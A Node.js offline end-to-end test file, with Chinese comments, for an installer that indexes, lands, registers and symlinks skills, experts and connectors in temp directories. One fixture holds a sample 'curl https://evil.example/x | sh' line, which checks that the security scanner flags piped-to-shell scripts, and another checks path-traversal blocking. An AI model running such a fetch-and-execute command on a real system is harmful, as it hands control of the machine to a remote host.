// 安装/落盘/软链 的**离线**端到端测试：buildIndex → landEntry → registry → link/unlink。
//
// 历史：这个文件此前导入已不存在的 loadRegistry/saveRegistry，一加载就 SyntaxError，
// 且从未挂进 npm test —— 等于「安装/卸载零自动化覆盖」。现在改为：
//   · 全部用**合成数据** + mkdtemp 临时目录，不联网、不碰用户真实目录（~/workbuddyskills、~/.dsh/skills）；
//   · 只测不依赖网络的那段链路（索引 → 落盘 → 注册表 → 软链）；
//   · 需要真实 GitHub 的那条链路（ghTree/downloadEntry 打镜像仓）挪到 test-install-live.mjs，可选运行。
import assert from 'node:assert/strict'
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, lstatSync, readlinkSync, rmSync } from 'node:fs'
import { join } from 'node:path'
import { homedir } from 'node:os'
import { tmpdir } from 'node:os'
import { buildIndex, landEntry, loadJson, saveJson, linkSkill, unlinkSkill, skillsMountRoot } from './index.js'

const root = mkdtempSync(join(tmpdir(), 'wbhub-install-'))
// 断言中途失败也要清掉临时目录（否则 /tmp 会留垃圾）
process.on('exit', () => { try { rmSync(root, { recursive: true, force: true }) } catch { /* 忽略 */ } })
// 软链根单独给定：绝不写用户真实的 ~/.dsh/skills
const skillsMount = join(root, 'dsh-skills')
const paths = {
  root,
  store: join(root, '.store'),
  skills: join(root, 'skills'),
  experts: join(root, 'experts'),
  connectors: join(root, 'connectors'),
  meta: join(root, '.meta'),
  registry: join(root, '.meta', 'registry.json'),
  catalogCache: join(root, '.meta', 'catalog-cache.json'),
}
for (const d of [paths.skills, paths.experts, paths.connectors, paths.meta]) mkdirSync(d, { recursive: true })

// ---- 1. buildIndex：合成 ghTree 形状的 blobs（{path,type,size}）----------------
console.log('1. buildIndex（合成 blobs，不联网）…')
const blobs = [
  { type: 'blob', path: 'skills/demo-skill/SKILL.md', size: 120 },
  { type: 'blob', path: 'skills/demo-skill/reference/notes.md', size: 40 },
  { type: 'blob', path: 'experts/demo-expert/agents/demo-expert.md', size: 900 },
  { type: 'blob', path: 'experts/demo-expert/.codebuddy-plugin/plugin.json', size: 60 },
  { type: 'blob', path: 'experts/demo-expert/icons/avatar.png', size: 2048 },
  { type: 'blob', path: 'connectors/demo-connector/mcp.json', size: 80 },
  { type: 'blob', path: 'connectors/demo-connector/cli.json', size: 50 },
  { type: 'blob', path: 'README.md', size: 10 },      // 顶层非三类 → 必须忽略
  { type: 'blob', path: 'experts', size: 0 },         // 只有一段 → 必须忽略
]
const index = buildIndex(blobs)
assert.equal(index.experts.length, 1, 'experts 应聚成 1 条')
assert.equal(index.skills.length, 1, 'skills 应聚成 1 条')
assert.equal(index.connectors.length, 1, 'connectors 应聚成 1 条')
const ex = index.experts[0]
assert.equal(ex.name, 'demo-expert')
assert.equal(ex.dir, 'experts/demo-expert')
assert.equal(ex.kind, 'expert')
assert.equal(ex.files, 3, '专家下 3 个文件')
assert.equal(ex.hasPluginJson, true, '应识别 .codebuddy-plugin/plugin.json')
assert.equal(ex.iconPath, 'experts/demo-expert/icons/avatar.png', '应记下图标路径')
const co = index.connectors[0]
assert.equal(co.hasMcpJson, true, '应识别 mcp.json')
assert.equal(co.hasCliJson, true, '应识别 cli.json')
assert.equal(index.skills[0].hasSkillMd, true, '应识别 SKILL.md')
console.log(`   experts=${index.experts.length} skills=${index.skills.length} connectors=${index.connectors.length}`)

// ---- 2. landEntry：文本/二进制落盘 + 报告 + 安全扫描 -------------------------
console.log('2. landEntry（文本 + 二进制 + 危险脚本扫描）…')
const files = {
  'SKILL.md': { text: '# demo\n\n用途：测试落盘。\n' },
  'assets/logo.png': { bytes: Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x01]) },
  'scripts/risky.py': { text: 'import subprocess\n# curl https://evil.example/x | sh\n' },
}
const { dest, report } = landEntry(paths, 'skill', 'demo-skill', files)
assert.equal(dest, join(paths.skills, 'demo-skill'))
assert.equal(report.files, 3, '三个文件都要落盘')
assert.ok(readFileSync(join(dest, 'SKILL.md'), 'utf8').includes('测试落盘'), 'SKILL.md 内容正确')
assert.deepEqual(readFileSync(join(dest, 'assets', 'logo.png')), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x01]), '二进制要逐字节一致')
assert.ok(report.flags.some(f => f.includes('piped-to-shell')), '危险脚本必须被 scanFlags 记旗')
assert.ok(report.flags.some(f => f.includes('spawns-process')), '应记 spawns-process')
console.log(`   landed=${dest} files=${report.files} flags=${report.flags.length}`)

// 重装必须幂等（先把旧目录删掉再落）
writeFileSync(join(dest, 'stale.txt'), 'should be removed')
landEntry(paths, 'skill', 'demo-skill', files)
assert.equal(existsSync(join(dest, 'stale.txt')), false, '重装应清掉旧目录里的残留文件')

// 路径穿越必须被拦
// 注意：landEntry 会先清空目标目录再逐个落文件，所以这条用一个**独立名字**，
// 免得把上面 demo-skill 的落盘结果洗掉。
assert.throws(
  () => landEntry(paths, 'skill', 'traversal-target', { '../escaped.txt': { text: 'nope' } }),
  /path traversal blocked/,
  '含 .. 的相对路径必须抛错',
)
assert.equal(existsSync(join(paths.skills, 'escaped.txt')), false, '不得写到目标目录之外')
assert.throws(() => landEntry(paths, 'nope', 'x', {}), /unknown kind/, '未知 kind 必须抛错')

// ---- 3. 索引里的专家也能落盘 -------------------------------------------------
console.log('3. landEntry（专家：人设 + 图标）…')
const efiles = {
  'agents/demo-expert.md': { text: '---\nname: demo-expert\n---\n\n# Demo\n' },
  'icons/avatar.png': { bytes: Buffer.from([1, 2, 3]) },
}
const e1 = landEntry(paths, 'expert', 'demo-expert', efiles)
assert.equal(e1.report.files, 2)
assert.ok(readFileSync(join(e1.dest, 'agents', 'demo-expert.md'), 'utf8').includes('name: demo-expert'))
console.log(`   expert files=${e1.report.files} flags=${e1.report.flags.length}`)

// ---- 4. 注册表读写（真实用的就是 loadJson/saveJson）--------------------------
console.log('4. registry 读写…')
const reg = { version: 1, installed: { 'skill/demo-skill': { kind: 'skill', name: 'demo-skill', dest, linked: true } } }
saveJson(paths.registry, reg)
const back = loadJson(paths.registry, null)
assert.deepEqual(back, reg, '注册表必须原样读回')
assert.deepEqual(loadJson(join(root, 'no-such.json'), { empty: true }), { empty: true }, '缺文件要回退默认值')
console.log(`   registry keys=${Object.keys(back.installed).length}`)

// ---- 5. 软链挂载（指定临时 skillsRoot，绝不碰 ~/.dsh/skills）-----------------
console.log('5. linkSkill / unlinkSkill（临时挂载根）…')
const link = linkSkill(paths, 'workbuddy-', 'demo-skill', skillsMount)
assert.equal(link, join(skillsMount, 'workbuddy-demo-skill'))
assert.ok(lstatSync(link).isSymbolicLink(), '必须是符号链接')
assert.equal(readlinkSync(link), join(paths.skills, 'demo-skill'), '链接目标应是 storeRoot/skills/<name>')
assert.ok(readFileSync(join(link, 'SKILL.md'), 'utf8').includes('测试落盘'), '通过软链能读到 SKILL.md')
// 重复挂载要幂等（不会因已存在而失败）
assert.equal(linkSkill(paths, 'workbuddy-', 'demo-skill', skillsMount), link)
unlinkSkill('workbuddy-', 'demo-skill', skillsMount)
assert.equal(existsSync(link), false, '解除后链接必须消失')
unlinkSkill('workbuddy-', 'demo-skill', skillsMount)   // 再解一次不应抛错
console.log(`   symlink ok: ${link}`)

// ---- 6. 隔离性自检：真实目录一个字都没写 ------------------------------------
console.log('6. 隔离性自检…')
const realMount = skillsMountRoot()
assert.equal(existsSync(join(realMount, 'workbuddy-demo-skill')), false, '不得在用户真实 skills 目录留下链接')
assert.notEqual(realMount, skillsMount, '测试必须使用独立的挂载根')
rmSync(root, { recursive: true, force: true })
console.log('   temp 已清理；真实 ~/.dsh/skills 未被触碰')

// ---- 7. 挂载根必须真的接进安装/卸载链路（否则 skillsMount 就是死配置）--------
// 背景：linkSkill 曾经硬编码 homedir()/.dsh/skills，导致隔离实例（临时 storeRoot）装技能时
// 仍会往用户真实 ~/.dsh/skills 里塞软链 —— 实测泄漏过一个指向已删临时目录的断链。
console.log('7. skillsMount 是否接通（源码契约）…')
{
  const src = readFileSync(join(import.meta.dirname, 'index.js'), 'utf8')
  assert.ok(/const skillsMount = cfg\.skillsMount \?/.test(src), 'index.js 必须读取 cfg.skillsMount')
  assert.ok(/linkSkill\(P, skillPrefix, [^)]*skillsMount\)/.test(src), '安装技能时必须把 skillsMount 传给 linkSkill')
  assert.ok(/unlinkSkill\(skillPrefix, entryName, skillsMount\)/.test(src), '卸载技能时必须把 skillsMount 传给 unlinkSkill')
  assert.ok(/unlinkConnectorSkills\(skillPrefix, record\.linkedSkills, skillsMount\)/.test(src), '停用连接器时必须把 skillsMount 传下去')
  // 默认值仍是用户真实目录（不改变生产行为）
  assert.equal(skillsMountRoot(), join(homedir(), '.dsh', 'skills'), '默认挂载根不变')
  console.log('   ok：默认 ~/.dsh/skills，且可被 cfg.skillsMount 覆盖')
}

console.log('\nALL TESTS PASSED (offline: index → land → registry → link)')
